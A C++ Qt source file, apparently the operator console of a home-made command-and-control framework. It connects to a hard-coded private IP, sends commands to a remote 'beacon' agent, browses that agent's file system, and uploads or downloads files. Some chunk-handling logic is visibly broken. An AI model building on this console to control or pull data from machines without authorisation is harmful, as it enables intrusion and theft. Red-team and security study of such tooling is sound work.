#include "mainwindow.h"
#include "./ui_mainwindow.h"
#include <QMessageBox>
#include <QDateTime>
#include <string>
#include "message_types.h"
#include <QDataStream>

#include <QDebug>
MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::MainWindow)
    , socket(new QTcpSocket(this))
    , model(new QStandardItemModel(this))
{
    ui->setupUi(this);


    InitializationLayout();
    connect(ui->pushButton, &QPushButton::clicked, this, &MainWindow::onConnectButtonClicked);
    connect(ui->lineEdit_3, SIGNAL(returnPressed()), this, SLOT(onSendButtonClicked()));
    connect(ui->tableView, &QTableView::customContextMenuRequested, this, &MainWindow::provideContextMenu);
    connect(socket, &QTcpSocket::readyRead, this, &MainWindow::onReadyRead);
    connect(ui->tabWidget, &QTabWidget::currentChanged, this, &MainWindow::onTabChanged);
    connect(ui->toolButton, SIGNAL(clicked()), this, SLOT(goToParentDirectory()));
    connect(ui->tableView, &QTableView::doubleClicked, this, &MainWindow::onDirectoryClicked);


}

MainWindow::~MainWindow()
{
    delete ui;
}

void MainWindow::onTabChanged(int index)
{

    QString inputText=ui->lineEdit_4->text();
    qDebug() <<index<< "Tab changed to:" << inputText.length();
    if(index==1 && inputText.length()==0){
        socket->write("LIST:");

    }

    // socket->write("FILE:D:\\Code\\Visual_Studio\\Mike_C2\\Mike_C2\\x64\\Debug\\6666.jpg");
}


void MainWindow::InitializationLayout()
{
    ui->tabWidget->addTab(ui->textEdit, "Beacon");
    ui->tabWidget->addTab(ui->tableView, "File Browser");
    ui->tableView->setSelectionMode(QAbstractItemView::SingleSelection); // 允许单行选择
    ui->tableView->setSelectionBehavior(QAbstractItemView::SelectRows); // 选择整行
    ui->tableView->setContextMenuPolicy(Qt::CustomContextMenu);
    ui->tableView->setEditTriggers(QAbstractItemView::NoEditTriggers);
    // QStandardItemModel *model = new QStandardItemModel();
    QHeaderView *horizontalHeader = ui->tableView->horizontalHeader();
    horizontalHeader->setSectionResizeMode(QHeaderView::Stretch);

    // 设置列的标题
    model->setHorizontalHeaderLabels(QStringList() << "Type" << "Name");
    QStringList dataList = {
        "[file] Agent.exe666",
        "[file] Agent.pdb",
        "[file] Client.exe",
        "[file] Client.pdb"
    };

    for(const QString &data : dataList) {
        QString type = data.mid(data.indexOf('[') + 1, data.indexOf(']') - 1);
        QString name = data.mid(data.indexOf(']') + 2);

        typeItem = new QStandardItem(type);
        nameItem = new QStandardItem(name);

        model->appendRow(QList<QStandardItem*>() << typeItem << nameItem);
    }
    ui->tableView->setModel(model);

    ui->toolButton->setIcon(QIcon("‪D:\Download\go_parent_dir.png"));

}

void MainWindow::onConnectButtonClicked() {
    qDebug() << "Attempting to connect to server...??";
    // socket->connectToHost("192.168.52.132",8080);
    socket->connectToHost("192.168.52.132",9363);

    if (socket->waitForConnected(30000)) {
        QMessageBox::information(this, "Connection", "Connected to server");
        socket->write("CLIENT");
    } else {
        QMessageBox::warning(this, "Connection", "Failed to connect to server1");
    }

}

void MainWindow::onSendButtonClicked() {
    QString inputText = ui->lineEdit_3->text(); // 获取QLineEdit的文本并保存到变量中


    qDebug() << "Input text: " << inputText; // 打印输入的文本（可选，需要#include <QDebug>）
    logMessage(true,inputText);
    if (socket->state() == QTcpSocket::ConnectedState) {
        socket->write(inputText.toUtf8());
    } else {
        QMessageBox::warning(this, "Connection", "Not connected to server");
    }
    ui->lineEdit_3->clear(); // 清空QLineEdit的内容
}

void MainWindow::processChunks(const QByteArray& data) {
    int totalSize = data.size();
    const char* ptr = data.constData();
    qDebug() << "processChunks IN! ";

    while (totalSize > 0) {
        std::vector<char> chunk_data(ptr, ptr + sizeof(Message));
                qDebug() << "deserialize IN ";
        Message msg = Message::deserialize(chunk_data);
            qDebug() << "deserialize IN! ";
        if(msg.type == MessageType::Binary){
            if (msg.type == MessageType::END) {
                qDebug() << "Translation Done! ";
                // saveToFile();
                break;
            }

            if (msg.validateChecksum()) {
                receivedChunks[msg.chunk_id] = msg.data;
            } else {
                qCritical() << "Checksum validation failed for chunk" << msg.chunk_id;
            }

            ptr += sizeof(Message);
            totalSize -= sizeof(Message);
        }
    }
}

void MainWindow::saveToFile() {
    QFile file(filename);
    if (!file.open(QIODevice::WriteOnly)) {
        qCritical() << "Cannot open file for writing:" << file.errorString();
        return;
    }
    // qDebug()<<receivedChunks.empty();
    // for (const auto& pair : receivedChunks) {
    //     file.write(pair.second.data(), pair.second.size());
    // }
    qDebug()<<"buffer size:"<<buffer.size();
    file.write(buffer);

    file.close();

    qDebug() << "File saved successfully";
}

void MainWindow::switchType(MessageType messageType) {
    switch (messageType) {
    case MessageType::Command: {
        // 处理文本消息
        qDebug() << "Command data:" ;
        qDebug() << "Command length:" << msg.length;
        std::string text(msg.data.begin(), msg.data.end());
        QString utf8_str=QString::fromLocal8Bit(text);
        logMessage(false, utf8_str);
        break;
    }
    case MessageType::Binary: {
        qDebug() << "Binary data:" << msg.length ;   //<<" ChunkID: "<<msg.chunk_id;
        receivedChunks[msg.chunk_id] = msg.data;

        break;
    }
    case MessageType::Text: {

        qDebug() << "Text data:" ;
        // std::string text(msg.data.begin(), msg.data.end());

        // QString utf8_str=QString::fromLocal8Bit(text);
        // logMessage(false, utf8_str);
        break;
    }
    case MessageType::FileList: {
        qDebug() << "FileList:" ;
        std::string text(msg.data.begin(), msg.data.end());
        QString utf8_str=QString::fromLocal8Bit(text);
        logMessage(false, utf8_str);

        model->clear();
        model->setHorizontalHeaderLabels(QStringList() << "Type" << "Name");
        QStringList list = utf8_str.split("[");
        QString firstItem = list.first();
        QString directory = utf8_str.mid(firstItem.length());
        qDebug() << "directory_path:"<<directory;
        ui->lineEdit_4->setText(firstItem);

        QStringList lists = directory.split("\n", Qt::SkipEmptyParts);

        for(const QString &data : lists) {
            QString type = data.mid(data.indexOf('[') + 1, data.indexOf(']') - 1);
            QString name = data.mid(data.indexOf(']') + 2);
            typeItem = new QStandardItem(type);
            nameItem = new QStandardItem(name);
            model->appendRow(QList<QStandardItem*>() << typeItem << nameItem);
        }
        ui->tableView->setModel(model);
        break;
    }
    case MessageType::FIleSize: {
        buffer.clear();
        qDebug() << "FIleSize:" <<msg.filesize;
        msg_length=msg.filesize;
        isFile=true;
        break;
    }
    case MessageType::END: {
        qDebug() << "Transfer File Done !" ;
        saveToFile();
        break;
    }
    default:
        qDebug() << "Unknown message type received.";
        break;
    }
}

void MainWindow::onReadyRead() {
    // QDataStream stream(socket);
    // stream.setByteOrder(QDataStream::LittleEndian);  // 确保字节顺序与发送端一致

    // qDebug()<<isFile;
    while (socket->bytesAvailable() > 0) {
        // 如果正在读取新的数据包
        qDebug()<<"接受到数据"<<socket->bytesAvailable();
    if(isFile){
        buffer.append(socket->readAll());
        qDebug()<<buffer.size()<<" | msg_length: "<<msg_length<<" filesize |bytesAvailable: "<<socket->bytesAvailable();
        if(buffer.size()>=msg_length)
        {
            saveToFile();
            isFile=false;
            return;//return后，剩余的报文内容会接着触发
        }
    }else{
        QByteArray bytes=socket->readAll();
        // qDebug()<<bytes.size()<<" | quint32: "<<sizeof(quint32);
        std::vector<char> data(bytes.begin(), bytes.end());
        msg = Message::deserialize(data);
        // qDebug() << "data size:." << msg.length;
        MessageType messageType = static_cast<MessageType>(msg.type);
        switchType(messageType);
    }
    }
}

void MainWindow::onDirectoryClicked(const QModelIndex &index) {
    if (!index.isValid())
        return;

    QVariant data = index.siblingAtColumn(0).data(); // 0 代表第一列的列索引
    qDebug() << "Data in the double-clicked row, first column: " << index.siblingAtColumn(1).data().toString();
    if(index.siblingAtColumn(0).data()=="dir"){
        QString inputText = ui->lineEdit_4->text();
        QDir dir(inputText);

        // 使用filePath()拼接路径和字符串
        QString newPath = dir.filePath(index.siblingAtColumn(1).data().toString().trimmed());

        qDebug() << "New path:" << newPath;
        getFileSystem(true,newPath);
    }


}

void MainWindow::goToParentDirectory() {
    QString inputText = ui->lineEdit_4->text();
    qDebug() << "goToParentDirectoryh:" << inputText;
    QDir dir(inputText);
    // 跳转到父目录
    if(dir.cdUp())
    {
        // 获取父路径
        QString parentPath = dir.absolutePath();
        qDebug() << "Parent path:" << parentPath;
        ui->lineEdit_4->setText(parentPath);
        getFileSystem(true,parentPath);
    }
}

void MainWindow::getFileSystem(bool start,const QString &message) {
    if(start){
        socket->write("LIST:"+message.toUtf8());
    }

}

void MainWindow::provideContextMenu(const QPoint &position) {
    QModelIndex index = ui->tableView->indexAt(position);
    if (index.isValid()) { // 确保点击时有项被选中
        QMenu *menu = new QMenu(this);

        QAction *action1 = menu->addAction("文件上传");
        QAction *action2 = menu->addAction("文件下载");
        // 更多操作...

        // 连接相应的操作到处理函数
        connect(action1, &QAction::triggered, this, &MainWindow::uploadFile);
        connect(action2, &QAction::triggered, [this, index](){this->downloadFile(index);});
        // 更多操作...

        // 弹出上下文菜单
        menu->popup(ui->tableView->viewport()->mapToGlobal(position));
    }
}

void MainWindow::uploadFile() {
    QString inputText = ui->lineEdit_4->text();
    // 使用 QFileDialog 弹出文件选择对话框
    QString filePath = QFileDialog::getOpenFileName(this, tr("Select File to Upload"),
                                                    QDir::homePath(), tr("All Files (*)"));
    QFileInfo fileInfo(filePath);

    // 检查用户是否选择了文件
    if (!filePath.isEmpty()) {
        QFile file(filePath);
        if (!file.open(QIODevice::ReadOnly)) {
            qDebug() << "Could not open file";
            return;
        }
        qint64 fileSize = file.size();
        QString send_fileName = "isFile"+inputText+"\\"+fileInfo.fileName()+"|"+QString::number(fileSize);

        qDebug() << "上传文件路径: " << filePath<<"  | "<<send_fileName;
        socket->write(send_fileName.toUtf8());
        socket->flush();
        QThread::sleep(1);

        while (!file.atEnd()) {
            QByteArray buffer = file.read(1024*64);  // 将文件数据读取到buffer中，每次读取1024字节
            socket->write(buffer);  // 将buffer中的数据发送出去
            qDebug() << "send buffer size: "<<buffer.size();
            socket->waitForBytesWritten();  // 等待数据发送完成
            socket->flush();
        }
        QThread::sleep(1);
        socket->write("Transfer_File_end");
        socket->flush();
        qDebug() << "文件传输完毕！ ";
        file.close();  // 关闭文件

        // 在此处添加上传或处理文件的代码
    }
}

void MainWindow::downloadFile(const QModelIndex &index) {

    QVariant data = index.siblingAtColumn(1).data(); // 示例：获取第一列的数据
    qDebug() << "downloadfile name: " << data.toString();
    if(index.siblingAtColumn(0).data()=="file"){
        QString inputText = ui->lineEdit_4->text();
        QDir dir(inputText);
        filename=index.siblingAtColumn(1).data().toString().trimmed();
        // 使用filePath()拼接路径和字符串
        QString newPath = dir.filePath(index.siblingAtColumn(1).data().toString().trimmed());
        // qDebug() << "New path:" << newPath;
        socket->write("FILE:"+newPath.toUtf8());

    }

}

void MainWindow::logMessage(bool isMy,const QString &message) {
    // 获取当前日期和时间
    QDateTime currentDateTime = QDateTime::currentDateTime();
    // 格式化日期和时间为字符串
    QString currentDateTimeString = currentDateTime.toString("yyyy-MM-dd HH:mm:ss");
    // 创建日志消息
    QString logMessage;

    if(isMy){
        logMessage = QString("[%1] <font color='red'><b>beacon>  %2</b></font> \n").arg(currentDateTimeString, message);
        // logMessage = QString("[%1] beacon>  %2 \n").arg(currentDateTimeString,message);
    }else{
        logMessage = QString("[%1] : %2 \n").arg(currentDateTimeString,message);
    }

    ui->textEdit->append(logMessage);
}
